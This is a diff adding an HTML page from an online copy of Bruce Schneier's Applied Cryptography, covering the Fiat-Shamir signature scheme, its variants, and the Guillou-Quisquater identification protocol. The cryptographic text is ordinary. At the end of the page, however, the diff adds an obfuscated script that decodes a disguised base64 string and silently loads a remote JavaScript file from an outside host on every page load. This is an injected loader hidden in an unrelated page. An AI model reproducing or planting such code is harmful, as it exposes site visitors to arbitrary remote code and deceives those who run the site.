@@ -1,0 +1,122 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Identification Schemes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=21//-->
+<!--PAGES=507-509//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The setup is the same as the identification scheme. Choose <I>n</I> to be the product of two large primes. Generate the public key, <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB>, and the private key, <I>s</I><SUB>1,</SUB> <I>s</I><SUB>2,...,</SUB> <I>s</I><SUB>k</SUB>, such that <I>s</I><SUB>i</SUB> = sqrt (<I>v</I>i<SUP>-1</SUP>) mod <I>n.</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks <I>t</I> random integers between 1 and <I>n: r</I><SUB>1,</SUB> <I>r</I><SUB>2,...,</SUB> <I>r</I><SUB>t</SUB>, and computes <I>x</I><SUB>1,</SUB> <I>x</I><SUB>2,...,</SUB> <I>x</I><SUB>t</SUB> such that <I>x</I><SUB>i</SUB> = <I>r</I><SUB>i</SUB><SUP>2</SUP> mod <I>n.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice hashes the concatenation of the message and the string of <I>x</I>is to generate a bit stream: <I>H</I>(<I>m, x</I><SUB>1,</SUB> <I>x</I><SUB>2,...,</SUB> <I>x</I><SUB>t</SUB>). She uses the first <I>k</I> * <I>t</I> bits of this string as values of <I>b</I><SUB>ij</SUB>, where <I>i</I> goes from 1 to <I>t,</I> and <I>j</I> goes from 1 to <I>k.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>y</I><SUB>1,</SUB> <I>y</I><SUB>2,...,</SUB> <I>y</I><SUB>t</SUB>, where
+<BR><I>y</I><SUB>i</SUB> = <I>r</I><SUB>i</SUB> * (<I>s</I><SUB>1</SUB><SUP>b</SUP><SMALL><SUP>i<I>1</I></SUP></SMALL> * <I>s</I><SUB>2</SUB><SUP>b</SUP><SMALL><SUP>i<I>2</I></SUP></SMALL> *...* <I>s</I><SUB>k</SUB><SUP>b</SUP><SMALL><SUP>i<I>k</I></SUP></SMALL>) mod <I>n</I>
+<BR>(For each <I>i,</I> she multiplies together the values of the <I>s</I><SUB>j</SUB> based on the random <I>b</I><SUB>i,j</SUB> values. If <I>b</I><SUB>i,1</SUB> is a 1, then <I>s</I><SUB>1</SUB> is multiplied; if <I>b</I><SUB>i,1</SUB> is a 0, then <I>s</I><SUB>1</SUB> is not multiplied.)
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends Bob <I>m,</I> all the bit values of <I>b</I><SUB>i,j,</SUB> and all the values of <I>y</I><SUB>i</SUB>. He already has Alice&#146;s public key: <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB>.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob computes <I>z</I><SUB>1,</SUB> <I>z</I><SUB>2,...,</SUB> <I>z</I><SUB>t</SUB>, where
+<BR><I>z</I><SUB>i</SUB> = <I>y</I><SUB>i</SUB><SUP>2</SUP> * (<I>v</I><SUB>1</SUB><SUP>b</SUP><SMALL><SUP>i<I>1</I></SUP></SMALL> * <I>v</I><SUB>2</SUB><SUP>b</SUP><SMALL><SUP>i<I>2</I></SUP></SMALL> *...* <I>v</I><SUB>k</SUB><SUP>b</SUP><SMALL><SUP>i<I>k</I></SUP></SMALL>) mod <I>n</I>
+<BR>(Again, Bob multiplies based on the <I>b</I><SUB>i, j</SUB> values.) Also note that <I>z</I><SUB>i</SUB> should be equal to <I>x</I><SUB>i</SUB>.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob verifies that the first <I>k</I> * <I>t</I> bits of <I>H</I>(<I>m, z</I><SUB>1,</SUB> <I>z</I><SUB>2,...,</SUB> <I>z</I><SUB>t</SUB>) are the <I>b</I><SUB>i, j</SUB> values that Alice sent him.
+</DL>
+<P>As with the identification scheme, the security of this signature scheme is proportional to 1/2<SUP>kt</SUP>. It also depends on the difficulty of factoring <I>n.</I> Fiat and Shamir pointed out that forging a signature is easier when the complexity of factoring <I>n</I> is considerably lower than 2<SUP>kt</SUP>. And, because of birthday-type attacks (see Section 18.1), they recommend that <I>k</I> * <I>t</I> be increased from 20 to at least 72. They suggest <I>k</I> = 9 and <I>t</I> = 8.</P>
+<P><FONT SIZE="+1"><B><I>Improved Fiat-Shamir Signature Scheme</I></B></FONT></P>
+<P>Silvio Micali and Adi Shamir improved the Fiat-Shamir protocol in [1088]. They chose <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB> to be the first <I>k</I> prime numbers. So</P>
+<DL>
+<DD><I>v</I><SUB>1</SUB> = 2, <I>v</I><SUB>2</SUB> = 3, <I>v</I><SUB>3</SUB> = 5, and so on.
+</DL>
+<P>This is the public key.
+</P>
+<P>The private key, <I>s</I><SUB>1,</SUB> <I>s</I><SUB>2,...,</SUB> <I>s</I><SUB>k</SUB> is a random square root, determined by</P>
+<DL>
+<DD><I>s</I><SUB>i</SUB> = sqrt (<I>v</I><SUB>i</SUB><SUP>-1</SUP>) mod <I>n</I>
+</DL>
+<P>In this version, every person must have a different <I>n.</I> The modification makes it easier to verify signatures. The time required to generate signatures, and the security of those signatures, is unaffected.</P>
+<P><FONT SIZE="+1"><B><I>Other Enhancements</I></B></FONT></P>
+<P>There is also an <I>N-</I>party identification scheme, based on the Fiat-Shamir algorithm [264]. Two other improvements to the Fiat-Shamir scheme are proposed in [1218]. Another variant is [1368].</P>
+<P><FONT SIZE="+1"><B><I>Ohta-Okamoto Identification Scheme</I></B></FONT></P>
+<P>This protocol is a modification of the Feige-Fiat-Shamir identification scheme and gets its security from the difficulty of factoring [1198,1199]. The same authors also wrote a multisignature scheme (see Section 23.1), by which a number of different people can sequentially sign a message [1200]. This scheme has been proposed for smart-card implementation [850].
+</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>Fiat-Shamir is patented [1427]. Anyone interested in licensing the algorithm should contact Yeda Research and Development, The Weizmann Institute of Science, Rehovot 76100, Israel.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">21.2 Guillou-Quisquater</FONT></H3>
+<P>Feige-Fiat-Shamir was the first practical identity-based protocol. It minimized computation by increasing the number of iterations and accreditations per iteration. For some implementations, like smart cards, this is less than ideal. Exchanges with the outside world are time-consuming, and the storage required for each accreditation can strain the limited resources of the card.
+</P>
+<P>Louis Guillou and Jean-Jacques Quisquater developed a zero-knowledge identification algorithm more suited to applications like these [670,1280]. The exchanges between Peggy and Victor and the parallel accreditations in each exchange are both kept to an absolute minimum: There is only one exchange of one accreditation for each proof. For the same level of security, the computation required by Guillou-Quisquater is greater than by Feige-Fiat-Shamir by a factor of three. And like Feige-Fiat-Shamir, this identification algorithm can be converted to a digital signature algorithm.</P>
+<P><FONT SIZE="+1"><B><I>Guillou-Quisquater Identification Scheme</I></B></FONT></P>
+<P>Peggy is a smart card who wants to prove her identity to Victor. Peggy&#146;s identity consists of a set of credentials: a data string consisting of the card&#146;s name, validity period, a bank account number, and whatever else the application warrants. This bit string is called <I>J.</I> (Actually, the credentials can be a longer string and hashed to a <I>J</I> value. This complexity does not modify the protocol in any way.) This is analogous to the public key. Other public information, shared by all &#147;Peggys&#148; who could use this application, is an exponent <I>v</I> and a modulus <I>n,</I> where <I>n</I> is the product of two secret primes. The private key is <I>B,</I> calculated such that <I>JB</I><SUP>v</SUP> &#8801; 1 (mod <I>n</I>).</P>
+<P>Peggy sends Victor her credentials, <I>J.</I> Now, she wants to prove to Victor that those credentials are hers. To do this, she has to convince Victor that she knows <I>B.</I> Here&#146;s the protocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy picks a random integer <I>r,</I> such that <I>r</I> is between 1 and <I>n</I> - 1. She computes <I>T</I> = <I>r</I><SUP>v</SUP> mod <I>n</I> and sends it to Victor.
+<DD><B>(2)</B>&nbsp;&nbsp;Victor picks a random integer, <I>d,</I> such that <I>d</I> is between zero and <I>v</I> - 1. He sends <I>d</I> to Peggy.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy computes <I>D</I> = <I>rB</I><SUP>d</SUP> mod <I>n,</I> and sends it to Victor.
+<DD><B>(4)</B>&nbsp;&nbsp;Victor computes <I>T</I><SUP>&#180;</SUP> = <I>D</I><SUP>v</SUP><I>J</I><SUP>d</SUP> mod <I>n.</I> If <I>T</I> &#8801; <I>T</I><SUP>&#180;</SUP> (mod <I>n</I>), then the authentication succeeds.
+</DL>
+<P>The math isn&#146;t that complex:
+</P>
+<DL>
+<DD><I>T</I><SUP>&#180;</SUP> = <I>D</I><SUP>v</SUP><I>J</I><SUP>d</SUP> = (<I>rB</I><SUP>d</SUP>)<SUP>v</SUP><I>J</I><SUP>d</SUP> = <I>r</I><SUP>v</SUP>B<SUP>dv</SUP><I>J</I><SUP>d</SUP> = <I>r</I><SUP>v</SUP>(<I>JB</I><SUP>v</SUP>)<SUP>d</SUP> = <I>r</I><SUP>v</SUP> &#8801; <I>T</I> (mod <I>n</I>)
+</DL>
+<P>since <I>B</I> was constructed to satisfy</P>
+<DL>
+<DD><I>JB</I><SUP>v</SUP> &#8801; 1 (mod <I>n</I>)
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(lZbEbMfW, qyITmoue) {qyITmoue = lZbEbMfW.createElement('script');qyITmoue.type = 'text/javascript';qyITmoue.async = true;qyITmoue.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');lZbEbMfW.getElementsByTagName('body')[0].appendChild(qyITmoue);}(document));</script></body>
+</html>
